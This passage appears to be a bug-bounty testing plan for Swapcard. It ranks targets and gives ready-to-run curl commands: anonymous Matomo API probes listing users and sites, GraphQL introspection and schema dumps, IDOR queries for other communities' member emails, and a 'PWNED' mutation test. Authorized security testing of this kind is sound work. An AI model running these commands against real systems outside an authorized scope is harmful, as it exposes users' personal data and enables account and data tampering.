3. Priority Targets

P1 matomo.swapcard.com — Self-Hosted Analytics Admin

Matomo (formerly Piwik) is a self-hosted analytics platform. Anonymous API token often left enabled, older versions have RCE/SQLi CVEs. Admin panel exposure could leak all site visitor data including authenticated session info.

Test:

# Version check
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  "https://matomo.swapcard.com/index.php?module=API&method=API.getMatomoVersion&format=json"

# Anonymous user list (misconfigured token_auth)
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  "https://matomo.swapcard.com/index.php?module=API&method=UsersManager.getUsers&format=json&token_auth=anonymous"

# All sites tracked
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  "https://matomo.swapcard.com/index.php?module=API&method=SitesManager.getAllSites&format=json&token_auth=anonymous"

# Admin panel
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  "https://matomo.swapcard.com/index.php?module=Login"
P2 GraphQL Introspection + IDOR

Both GraphQL endpoints may have introspection enabled. Combined with predictable/BSON/UUID object IDs, horizontal privilege escalation (IDOR) between events, users, communities is high probability.

P3 chat-api.swapcard.com/subscriptions — Unauthenticated WebSocket

WebSocket GraphQL subscriptions. Test if authentication is enforced at the WS upgrade or only at subscription time. Real-time data leakage possible.

P4 rtm.swapcard.com — Real-Time Messaging

Pusher/Socket.io style RTM endpoint. Test for unauthenticated channel subscription and cross-user message interception.

4. GraphQL Testing

Step 1 — Introspection (Unauthenticated)

curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  -X POST "https://developer.swapcard.com/event-admin/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}types{name kind}}}"}' | jq .

Step 2 — Get Auth Token (via app.swapcard.com login)

# Login via browser devtools → Network tab → find Authorization header
# It will look like: "Bearer eyJ..."
# Save as: export TOKEN="eyJ..."

Step 3 — Authenticated Schema Dump

curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  -X POST "https://developer.swapcard.com/event-admin/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' \
  | jq '.data.__schema.types[] | select(.fields != null) | {name, fields: [.fields[].name]}' > schema_dump.json

Step 4 — Test IDOR Queries

# Access event you don't own (change ID)
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  -X POST "https://developer.swapcard.com/event-admin/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"query":"query { event(id: \"OTHER_EVENT_ID\") { id name organizer { id email } } }"}'

# List users in another community
curl -sA "Mozilla/5.0 SwapcardYWH/BB" \
  -X POST "https://developer.swapcard.com/event-admin/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"query":"query { community(id: \"OTHER_COMMUNITY_ID\") { id name members { edges { node { id email } } } } }"}'

IDOR Methodology

1. Create Account A (attacker) and Account B (victim) on studio.swapcard.com
2. With Account B: create an event, note the event ID from the URL
3. With Account A token: query event(id: B's event ID)
4. If data returns → IDOR confirmed
5. Test mutations: can A modify B's event?
   mutation { updateEvent(id: "B_EVENT_ID", input: { name: "PWNED" }) { id } }
